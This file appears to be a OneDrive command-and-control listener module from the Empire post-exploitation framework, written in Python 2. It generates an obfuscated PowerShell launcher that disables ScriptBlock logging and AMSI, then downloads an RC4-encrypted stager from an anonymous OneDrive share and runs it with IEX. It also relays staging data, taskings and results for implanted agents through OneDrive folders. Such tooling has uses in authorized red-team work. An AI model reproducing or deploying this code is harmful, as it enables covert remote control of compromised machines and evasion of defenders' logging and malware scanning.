import base64
import random
import os
import re
import time
import copy
import traceback
import sys
from pydispatch import dispatcher
from requests import Request, Session

#Empire imports
from lib.common import helpers
from lib.common import agents
from lib.common import encryption
from lib.common import packets
from lib.common import messages

class Listener:
    def __init__(self, mainMenu, params=[]):
        self.info = {
                'Name': 'Onedrive',
                'Author': ['@mr64bit'],
                'Description': ('Starts a Onedrive listener.'),
                'Category': ('third_party'),
                'Comments': []
                }

        self.options = {
            'Name' : {
                'Description'   :   'Name for the listener.',
                'Required'      :   True,
                'Value'         :   'onedrive'
            },
            'ClientID' : {
                'Description'   :   'Client ID of the OAuth App.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'AuthCode' : {
                'Description'   :   'Auth code given after authenticating OAuth App.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'BaseFolder' : {
                'Description'   :   'The base Onedrive folder to use for comms.',
                'Required'      :   True,
                'Value'         :   'empire'
            },
            'StagingFolder' : {
                'Description'   :   'The nested Onedrive staging folder.',
                'Required'      :   True,
                'Value'         :   'staging'
            },
            'TaskingsFolder' : {
                'Description'   :   'The nested Onedrive taskings folder.',
                'Required'      :   True,
                'Value'         :   'taskings'
            },
            'ResultsFolder' : {
                'Description'   :   'The nested Onedrive results folder.',
                'Required'      :   True,
                'Value'         :   'results'
            },
            'Launcher' : {
                'Description'   :   'Launcher string.',
                'Required'      :   True,
                'Value'         :   'powershell -noP -sta -w 1 -enc '
            },
            'StagingKey' : {
                'Description'   :   'Staging key for intial agent negotiation.',
                'Required'      :   True,
                'Value'         :   'asdf'
            },
            'PollInterval' : {
                'Description'   :   'Polling interval (in seconds) to communicate with Onedrive.',
                'Required'      :   True,
                'Value'         :   '5'
            },
            'DefaultDelay' : {
                'Description'   :   'Agent delay/reach back interval (in seconds).',
                'Required'      :   True,
                'Value'         :   60
            },
            'DefaultJitter' : {
                'Description'   :   'Jitter in agent reachback interval (0.0-1.0).',
                'Required'      :   True,
                'Value'         :   0.0
            },
            'DefaultLostLimit' : {
                'Description'   :   'Number of missed checkins before exiting',
                'Required'      :   True,
                'Value'         :   10
            },
            'DefaultProfile' : {
                'Description'   :   'Default communication profile for the agent.',
                'Required'      :   True,
                'Value'         :   "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
            },
            'KillDate' : {
                'Description'   :   'Date for the listener to exit (MM/dd/yyyy).',
                'Required'      :   False,
                'Value'         :   ''
            },
            'WorkingHours' : {
                'Description'   :   'Hours for the agent to operate (09:00-17:00).',
                'Required'      :   False,
                'Value'         :   ''
            },
            'RefreshToken' : {
                'Description'   :   'Refresh token used to refresh the auth token',
                'Required'      :   False,
                'Value'         :   ''
            },
            'RedirectURI' : {
                'Description'   :   'Redirect URI of the registered application',
                'Required'      :   True,
                'Value'         :   "https://login.live.com/oauth20_desktop.srf"
            },
            'SlackToken' : {
                'Description'   :   'Your SlackBot API token to communicate with your Slack instance.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SlackChannel' : {
                'Description'   :   'The Slack channel or DM that notifications will be sent to.',
                'Required'      :   False,
                'Value'         :   '#general'
            }
        }

        self.mainMenu = mainMenu
        self.threads = {}

        self.options['StagingKey']['Value'] = str(helpers.get_config('staging_key')[0])

    def default_response(self):
        return ''

    def validate_options(self):

        self.uris = [a.strip('/') for a in self.options['DefaultProfile']['Value'].split('|')[0].split(',')]

        if (str(self.options['RefreshToken']['Value']).strip() == '') and (str(self.options['AuthCode']['Value']).strip() == ''):
            if (str(self.options['ClientID']['Value']).strip() == ''):
                print helpers.color("[!] ClientID needed to generate AuthCode URL!")
                return False
            params = {'client_id': str(self.options['ClientID']['Value']).strip(),
                      'response_type': 'code',
                      'redirect_uri': self.options['RedirectURI']['Value'],
                      'scope': 'files.readwrite offline_access'}
            req = Request('GET','https://login.microsoftonline.com/common/oauth2/v2.0/authorize', params = params)
            prep = req.prepare()
            print helpers.color("[*] Get your AuthCode from \"%s\" and try starting the listener again." % prep.url)
            return False

        for key in self.options:
            if self.options[key]['Required'] and (str(self.options[key]['Value']).strip() == ''):
                print helpers.color("[!] Option \"%s\" is required." % (key))
                return False

        return True

    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
        if not language:
            print helpers.color("[!] listeners/onedrive generate_launcher(): No language specified")

        if listenerName and (listenerName in self.threads) and (listenerName in self.mainMenu.listeners.activeListeners):
            listener_options = self.mainMenu.listeners.activeListeners[listenerName]['options']
            staging_key = listener_options['StagingKey']['Value']
            profile = listener_options['DefaultProfile']['Value']
            launcher = listener_options['Launcher']['Value']
            staging_key = listener_options['StagingKey']['Value']
            poll_interval = listener_options['PollInterval']['Value']
            base_folder = listener_options['BaseFolder']['Value'].strip("/")
            staging_folder = listener_options['StagingFolder']['Value']
            taskings_folder = listener_options['TaskingsFolder']['Value']
            results_folder = listener_options['ResultsFolder']['Value']

            if language.startswith("power"):
                launcher = '$ErrorActionPreference = \"SilentlyContinue\";' #Set as empty string for debugging

                if safeChecks.lower() == 'true':
                    launcher += helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")

                    # ScriptBlock Logging bypass
                    launcher += helpers.randomize_capitalization("$GPF=[ref].Assembly.GetType(")
                    launcher += "'System.Management.Automation.Utils'"
                    launcher += helpers.randomize_capitalization(").\"GetFie`ld\"(")
                    launcher += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
                    launcher += helpers.randomize_capitalization(");If($GPF){$GPC=$GPF.GetValue($null);If($GPC")
                    launcher += "['ScriptB'+'lockLogging']"
                    launcher += helpers.randomize_capitalization("){$GPC")
                    launcher += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
                    launcher += helpers.randomize_capitalization("$GPC")
                    launcher += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
                    launcher += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
                    launcher += "('EnableScriptB'+'lockLogging',0);"
                    launcher += helpers.randomize_capitalization("$val.Add")
                    launcher += "('EnableScriptBlockInvocationLogging',0);"
                    launcher += helpers.randomize_capitalization("$GPC")
                    launcher += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
                    launcher += helpers.randomize_capitalization("=$val}")
                    launcher += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
                    launcher += "'signatures','N'+'onPublic,Static'"
                    launcher += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")

                    # @mattifestation's AMSI bypass
                    launcher += helpers.randomize_capitalization("[Ref].Assembly.GetType(")
                    launcher += "'System.Management.Automation.AmsiUtils'"
                    launcher += helpers.randomize_capitalization(')|?{$_}|%{$_.GetField(')
                    launcher += "'amsiInitFailed','NonPublic,Static'"
                    launcher += helpers.randomize_capitalization(").SetValue($null,$true)};")
                    launcher += "};"
                    launcher += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")

                launcher += helpers.randomize_capitalization("$wc=New-Object SYstem.Net.WebClient;")

                if userAgent.lower() == 'default':
                    profile = listener_options['DefaultProfile']['Value']
                    userAgent = profile.split("|")[1]
                launcher += "$u='" + userAgent + "';"

                if userAgent.lower() != 'none' or proxy.lower() != 'none':
                    if userAgent.lower() != 'none':
                        launcher += helpers.randomize_capitalization("$wc.Headers.Add(")
                        launcher += "'User-Agent',$u);"

                    if proxy.lower() != 'none':
                        if proxy.lower() == 'default':
                            launcher += helpers.randomize_capitalization("$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;")
                        else:
                            launcher += helpers.randomize_capitalization("$proxy=New-Object Net.WebProxy;")
                            launcher += helpers.randomize_capitalization("$proxy.Address = '"+ proxy.lower() +"';")
                            launcher += helpers.randomize_capitalization("$wc.Proxy = $proxy;")
                    if proxyCreds.lower() == "default":
                        launcher += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
                    else:
                        username = proxyCreds.split(":")[0]
                        password = proxyCreds.split(":")[1]
                        domain = username.split("\\")[0]
                        usr = username.split("\\")[1]
                        launcher += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
                        launcher += helpers.randomize_capitalization("$wc.Proxy.Credentials = $netcred;")

                    launcher += "$Script:Proxy = $wc.Proxy;"

                # code to turn the key string into a byte array
                launcher += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
                launcher += ("'%s');" % staging_key)

                # this is the minimized RC4 launcher code from rc4.ps1
                launcher += helpers.randomize_capitalization('$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')

                launcher += helpers.randomize_capitalization("$data=$wc.DownloadData('")
                launcher += self.mainMenu.listeners.activeListeners[listenerName]['stager_url']
                launcher += helpers.randomize_capitalization("');$iv=$data[0..3];$data=$data[4..$data.length];")

                launcher += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")

                if obfuscate:
                    launcher = helpers.obfuscate(self.mainMenu.installPath, launcher, obfuscationCommand=obfuscationCommand)

                if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
                    return helpers.powershell_launcher(launcher, launcher)
                else:
                    return launcher

            if language.startswith("pyth"):
                print helpers.color("[!] listeners/onedrive generate_launcher(): Python agent not implimented yet")
                return "python not implimented yet"

        else:
            print helpers.color("[!] listeners/onedrive generate_launcher(): invalid listener name")

    def generate_stager(self, listenerOptions, encode=False, encrypt=True, language=None, token=None):
        """
        Generate the stager code
        """

        if not language:
            print helpers.color("[!] listeners/onedrive generate_stager(): no language specified")
            return None

        poll_interval = listenerOptions['PollInterval']['Value']
        staging_key = listenerOptions['StagingKey']['Value']
        base_folder = listenerOptions['BaseFolder']['Value']
        staging_folder = listenerOptions['StagingFolder']['Value']
        working_hours = listenerOptions['WorkingHours']['Value']
        profile = listenerOptions['DefaultProfile']['Value']

        if language.lower() == 'powershell':
            f = open("%s/data/agent/stagers/onedrive.ps1" % self.mainMenu.installPath)
            stager = f.read()
            f.close()

            stager = stager.replace("REPLACE_STAGING_FOLDER", "%s/%s" % (base_folder, staging_folder))
            stager = stager.replace('REPLACE_STAGING_KEY', staging_key)
            stager = stager.replace('REPLACE_POLLING_INTERVAL', poll_interval)
            stager = stager.replace("REPLACE_TOKEN", token)

            if working_hours != "":
                stager = stager.replace("REPLACE_WORKING_HOURS")

            randomized_stager = ''

            for line in stager.split("\n"):
                line = line.strip()

                if not line.startswith("#"):
                    if "\"" not in line:
                        randomized_stager += helpers.randomize_capitalization(line)
                    else:
                        randomized_stager += line

            if encode:
                return helpers.enc_powershell(randomized_stager)
            elif encrypt:
                RC4IV = os.urandom(4)
                return RC4IV + encryption.rc4(RC4IV+staging_key, randomized_stager)
            else:
                return randomized_stager

    def start_server(self, listenerOptions):

        def get_token(client_id, code):
            params = {'client_id': client_id,
                      'grant_type': 'authorization_code',
                      'scope': 'files.readwrite offline_access',
                      'code': code,
                      'redirect_uri': redirect_uri}
            try:
                r = s.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', data=params)
                s.headers['Authorization'] = "Bearer " + r.json()['access_token']
                # self.mainMenu.listeners.update_listener_options(listenerName, "RefreshToken", r.json()['refresh_token'])
                r_token = r.json()
                r_token['expires_at'] = time.time() + (int)(r_token['expires_in']) - 15
                r_token['update'] = True
                dispatcher.send("[*] Got new auth token", sender="listeners/onedrive")
                return r_token
            except KeyError, e:
                print helpers.color("[!] Something went wrong, HTTP response %d, error code %s: %s" % (r.status_code, r.json()['error_codes'], r.json()['error_description']))
                raise

        def renew_token(client_id, refresh_token):
            params = {'client_id': client_id,
                      'grant_type': 'refresh_token',
                      'scope': 'files.readwrite offline_access',
                      'refresh_token': refresh_token,
                      'redirect_uri': redirect_uri}
            try:
                r = s.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', data=params)
                s.headers['Authorization'] = "Bearer " + r.json()['access_token']
                r_token = r.json()
                r_token['expires_at'] = time.time() + (int)(r_token['expires_in']) - 15
                r_token['update'] = True
                dispatcher.send("[*] Refreshed auth token", sender="listeners/onedrive")
                return r_token
            except KeyError, e:
                print helpers.color("[!] Something went wrong, HTTP response %d, error code %s: %s" % (r.status_code, r.json()['error_codes'], r.json()['error_description']))
                raise

        def test_token(token):
            headers = s.headers.copy()
            headers['Authorization'] = 'Bearer ' + token

            request = s.get("%s/drive" % base_url, headers=headers)

            return request.ok

        def setup_folders():
            if not (test_token(token['access_token'])):
                raise ValueError("Could not set up folders, access token invalid")

            base_object = s.get("%s/drive/root:/%s" % (base_url, base_folder))
            if not (base_object.status_code == 200):
                print helpers.color("[*] Creating %s folder" % base_folder)
                params = {'@microsoft.graph.conflictBehavior': 'rename', 'folder': {}, 'name': base_folder}
                base_object = s.post("%s/drive/items/root/children" % base_url, json=params)
            else:
                print helpers.color("[*] %s folder already exists" % base_folder)

            for item in [staging_folder, taskings_folder, results_folder]:
                item_object = s.get("%s/drive/root:/%s/%s" % (base_url, base_folder, item))
                if not (item_object.status_code == 200):
                    print helpers.color("[*] Creating %s/%s folder" % (base_folder, item))
                    params = {'@microsoft.graph.conflictBehavior': 'rename', 'folder': {}, 'name': item}
                    item_object = s.post("%s/drive/items/%s/children" % (base_url, base_object.json()['id']), json=params)
                else:
                    print helpers.color("[*] %s/%s already exists" % (base_folder, item))

        def upload_launcher():
            ps_launcher = self.mainMenu.stagers.generate_launcher(listener_name, language='powershell', encode=False, userAgent='none', proxy='none', proxyCreds='none')
            #py_launcher = self.mainMenu.stagers.generate_launcher(listener_name, language='python', encode=False, userAgent='none', proxy='none', proxyCreds='none')

            r = s.put("%s/drive/root:/%s/%s/%s:/content" %(base_url, base_folder, staging_folder, "LAUNCHER-PS.TXT"),
                        data=ps_launcher, headers={"Content-Type": "text/plain"})
            #r = s.put("%s/drive/root:/%s/%s/%s:/content" %(base_url, base_folder, staging_folder, "STAGE0PY.TXT"),
                      #data=py_launcher, headers={"Content-Type": "text/plain"})

        def upload_stager():
            ps_stager = self.generate_stager(listenerOptions=listener_options, language='powershell', token=token['access_token'])
            r = s.put("%s/drive/root:/%s/%s/%s:/content" % (base_url, base_folder, staging_folder, "STAGE0-PS.txt"),
                        data=ps_stager, headers={"Content-Type": "application/octet-stream"})
            if r.status_code == 201 or r.status_code == 200:
                item = r.json()
                r = s.post("%s/drive/items/%s/createLink" % (base_url, item['id']),
                            json={"scope": "anonymous", "type": "view"},
                            headers={"Content-Type": "application/json"})
                stager_url = "https://api.onedrive.com/v1.0/shares/%s/driveitem/content" % r.json()['shareId']
                #Different domain for some reason?
                self.mainMenu.listeners.activeListeners[listener_name]['stager_url'] = stager_url

            else:
                print helpers.color("[!] Something went wrong uploading stager")
                print r.json()

        listener_options = copy.deepcopy(listenerOptions)

        listener_name = listener_options['Name']['Value']
        staging_key = listener_options['StagingKey']['Value']
        poll_interval = listener_options['PollInterval']['Value']
        client_id = listener_options['ClientID']['Value']
        auth_code = listener_options['AuthCode']['Value']
        refresh_token = listener_options['RefreshToken']['Value']
        base_folder = listener_options['BaseFolder']['Value']
        staging_folder = listener_options['StagingFolder']['Value'].strip('/')
        taskings_folder = listener_options['TaskingsFolder']['Value'].strip('/')
        results_folder = listener_options['ResultsFolder']['Value'].strip('/')
        redirect_uri = listener_options['RedirectURI']['Value']
        base_url = "https://graph.microsoft.com/v1.0"

        s = Session()

        if refresh_token:
            token = renew_token(client_id, refresh_token)
        else:
            token = get_token(client_id, auth_code)

        setup_folders()

        # Upload stage 0

        while True:
            #Wait until Empire is aware the listener is running
            try:
                if listener_name in self.mainMenu.listeners.activeListeners.keys():
                    upload_stager()
                    #upload_launcher()
                    break
                else:
                    time.sleep(1)
            except AttributeError:
                time.sleep(1)

        while True:
            time.sleep(int(poll_interval))
            try:
                if time.time() > token['expires_at']:
                    token = renew_token(client_id, token['refresh_token'])
                if token['update']:
                    self.mainMenu.listeners.update_listener_options(listener_name, "RefreshToken", token['refresh_token'])
                    token['update'] = False

                search = s.get("%s/drive/items/root:/%s/%s:/search(q='{*_*.txt}')" % (base_url, base_folder, staging_folder))
                for item in search.json()['value']:
                    try:
                        reg = re.search("^([A-Z0-9]+)_([0-9]).txt", item['name'])
                        if not reg:
                            continue
                        agent_name, stage = reg.groups()
                        if stage == '1':
                            print "Stage 1"
                            dispatcher.send("[*] Downloading %s/%s, %d bytes" % (staging_folder,  item['name'], item['size']), sender="listeners/onedrive")
                            content = s.get(item['@microsoft.graph.downloadUrl']).content
                            lang, return_val = self.mainMenu.agents.handle_agent_data(staging_key, content, listener_options)[0]
                            dispatcher.send("[*] Uploading %s/%s/%s_2.txt, %d bytes" % (base_folder, staging_folder, agent_name, len(return_val)), sender="listeners/onedrive")
                            s.put("%s/drive/items/root:/%s/%s/%s_2.txt:/content" % (base_url, base_folder, staging_folder, agent_name), data=return_val)
                            dispatcher.send("[*] Deleting %s/%s" % (staging_folder, item['name']), sender="listeners/onedrive")
                            s.delete("%s/drive/items/%s" % (base_url, item['id']))

                        if stage == '3':
                            print "Stage 3"
                            dispatcher.send("[*] Downloading %s/%s, %d bytes" % (staging_folder,  item['name'], item['size']), sender="listeners/onedrive")
                            content = s.get(item['@microsoft.graph.downloadUrl']).content
                            lang, return_val = self.mainMenu.agents.handle_agent_data(staging_key, content, listener_options)[0]
                            dispatcher.send("[*] Uploading %s/%s/%s_4.txt, %d bytes" % (base_folder, staging_folder, agent_name, len(return_val)), sender="listeners/onedrive")
                            s.put("%s/drive/items/root:/%s/%s/%s_4.txt:/content" % (base_url, base_folder, staging_folder, agent_name), data= return_val)
                            dispatcher.send("[*] Deleting %s/%s" % (staging_folder, item['name']), sender="listeners/onedrive")
                            s.delete("%s/drive/items/%s" % (base_url, item['id']))

                    except Exception, e:
                        print(traceback.format_exc())


            except Exception, e:
                print(e)

            s.close()


    def start(self, name=''):
        """
        Start a threaded instance of self.start_server() and store it in the
        self.threads dictionary keyed by the listener name.

        """
        listenerOptions = self.options
        if name and name != '':
            self.threads[name] = helpers.KThread(target=self.start_server, args=(listenerOptions,))
            self.threads[name].start()
            time.sleep(3)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()
        else:
            name = listenerOptions['Name']['Value']
            self.threads[name] = helpers.KThread(target=self.start_server, args=(listenerOptions,))
            self.threads[name].start()
            time.sleep(3)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()


    def shutdown(self, name=''):
        """
        Terminates the server thread stored in the self.threads dictionary,
        keyed by the listener name.
        """

        if name and name != '':
            print helpers.color("[!] Killing listener '%s'" % (name))
            self.threads[name].kill()
        else:
            print helpers.color("[!] Killing listener '%s'" % (self.options['Name']['Value']))
            self.threads[self.options['Name']['Value']].kill()
